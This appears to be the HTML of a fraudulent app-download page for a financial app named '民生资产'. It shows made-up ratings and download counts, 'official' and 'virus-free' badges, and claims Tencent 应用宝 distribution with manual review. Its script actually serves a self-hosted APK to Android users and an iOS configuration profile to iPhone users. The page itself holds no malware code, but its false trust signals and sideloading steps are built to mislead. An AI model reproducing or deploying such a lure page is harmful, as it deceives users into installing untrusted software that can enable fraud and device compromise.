<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>民生资产</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'PingFang SC', 'Helvetica Neue', Arial, sans-serif;
            background-color: #ffffff;
            color: #333333;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 80vh;
        }
        
        .logo-container {
            position: relative;
        }
        
        .logo {
            width: 100px;
            height: 100px;
        }
        
        .official-tag {
            position: absolute;
            top: -5px;
            right: -5px;
            background: #1890ff;
            color: white;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 2px;
        }
        
        .app-name {
            font-size: 20px;
            font-weight: bold;
            color: #333333;
        }
        
        .app-stats {
            font-size: 12px;
            color: #999999;
            margin-bottom: 30px;
        }
        
        .download-btn {
            width: 260px;
            height: 40px;
            background: #1890ff;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }
        
        .download-btn:hover {
            background: #40a9ff;
        }
        
        .download-tip {
            font-size: 12px;
            color: #0080ff;
            text-align: center;
            margin-bottom: 15px;
        }
        
        .tags {
            display: flex;
            gap: 10px;
            margin-bottom: 40px;
        }
        
        .tag {
            display: flex;
            align-items: center;
            font-size: 10px;
            color: #999999;
        }
        
        .tag img {
            width: 12px;
            height: 12px;
            margin-right: 4px;
        }
        
        .footer {
            margin-top: auto;
            padding: 20px 0;
            font-size: 10px;
            color: #999999;
            text-align: center;
            width: 100%;
        }
        
        .version-info {
            margin-bottom: 5px;
        }
        
        .app-certification {
            margin-bottom: 10px;
        }
        
        .tencent-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 5px;
        }
        
        .tencent-badge img {
            width: 80px;
        }
        
        .service-info {
            font-size: 9px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img class="logo" src="../logo主图形.png" alt="民生资产">
            <div class="official-tag">官方</div>
        </div>
        <h1 class="app-name">民生资产</h1>
        <p class="app-stats">5.0分 128万次下载 <span id="fileSize">计算中...</span></p>
        <button class="download-btn" onclick="downloadApp()">安全下载</button>
        <p class="download-tip">(腾讯应用宝下载，人工审核保证安全)</p>
        <div class="tags">
            <div class="tag">
                <img src="./security.svg" alt="无病毒">
                <span>无病毒</span>
            </div>
            <div class="tag">
                <img src="./ad.svg" alt="免广告骚扰">
                <span>免广告骚扰</span>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <p class="version-info">版本：6.2.6.5</p>
        <p class="app-certification"><span style="color: #0080ff;">民生资产</span> | <span style="color: #0080ff;">官方认证</span></p>
        <div class="tencent-badge">
            <img src="./txyyb.png" alt="腾讯应用宝">
        </div>
        <p class="service-info">该服务由应用宝技术提供</p>
    </div>
    
    <script>
        // 动态获取文件大小
        function getFileSize() {
            const xhr = new XMLHttpRequest();
            xhr.open('HEAD', './minsheng.apk', true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    const contentLength = xhr.getResponseHeader('Content-Length');
                    if (contentLength) {
                        const fileSize = parseInt(contentLength);
                        const fileSizeMB = (fileSize / (1024 * 1024)).toFixed(1);
                        document.getElementById('fileSize').textContent = fileSizeMB + 'MB';
                    }
                }
            };
            xhr.send();
        }
        
        // 页面加载时获取文件大小
        window.onload = function() {
            getFileSize();
        };
        
        function downloadApp() {
            // 这里可以根据设备类型跳转到不同的下载链接
            const userAgent = navigator.userAgent;
            let downloadUrl = '';
            
            if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
                // iOS: 下载 mobileconfig 描述文件，安装后在桌面生成 Web Clip 图标
                downloadUrl = './minsheng.mobileconfig';
            } else if (userAgent.includes('Android')) {
                // Android下载链接
                downloadUrl = './minsheng.apk';
            } else {
                // 默认下载链接
                downloadUrl = './minsheng.apk';
            }
            
            window.location.href = downloadUrl;
        }
    </script>
</body>
</html>
